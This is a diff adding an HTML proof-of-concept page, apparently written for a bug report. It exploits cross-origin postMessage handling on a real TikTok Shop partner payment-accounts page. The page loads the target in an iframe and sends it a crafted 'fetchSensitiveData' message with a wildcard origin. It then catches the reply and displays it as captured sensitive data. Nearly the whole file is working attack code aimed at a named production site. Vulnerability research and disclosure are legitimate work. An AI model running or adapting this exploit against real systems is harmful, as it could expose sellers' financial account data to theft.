@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cross-Origin Exploit PoC</title>
+</head>
+<body>
+    <h1>PoC: Exploiting Cross-Origin Message Hijacking</h1>
+    <!-- Iframe to load the target domain -->
+    <iframe src="https://partner.tiktokshop.com/affiliate-finance/payment-accounts?market=4" 
+            id="exploitedIframe" 
+            style="width: 100%; height: 500px; border: 1px solid red;">
+    </iframe>
+    
+    <script>
+        // Function to log incoming messages
+        function logMessage(event) {
+            try {
+                console.log("Message received by: " + document.location.href, 
+                            "\norigin: " + event.origin + 
+                            "\nsource: ", event.source, 
+                            "\ndata:", event.data);
+            } catch (error) {
+                // If the source window is cross-origin, handle it gracefully
+                console.log("Message received by: " + document.location.href, 
+                            "\norigin: " + event.origin + 
+                            "\nsource is cross-origin", 
+                            "\ndata:", event.data);
+            }
+        }
+
+        // Add event listener for all incoming messages
+        addEventListener("message", logMessage);
+
+        // Wait for the iframe to load
+        document.getElementById("exploitedIframe").onload = function () {
+            const maliciousMessage = "setImmediate$fetchSensitiveData"; // Malicious message
+            const targetIframe = document.getElementById("exploitedIframe").contentWindow;
+
+            // Send malicious message to the iframe
+            targetIframe.postMessage(maliciousMessage, "*");
+            console.log("Malicious message sent:", maliciousMessage);
+        };
+
+        // Listener to capture the response from the iframe
+        window.addEventListener("message", function (event) {
+            // Ensure the message is from the target domain
+            if (event.origin === "https://partner.tiktokshop.com") {
+                // Check if the data is an object
+                if (typeof event.data === 'object') {
+                    // Use JSON.stringify to display the object in a readable format
+                    alert("Sensitive Data Captured: " + JSON.stringify(event.data, null, 2));
+                } else {
+                    alert("Sensitive Data Captured: " + event.data);
+                }
+            }
+        });
+    </script>
+</body>
+</html>
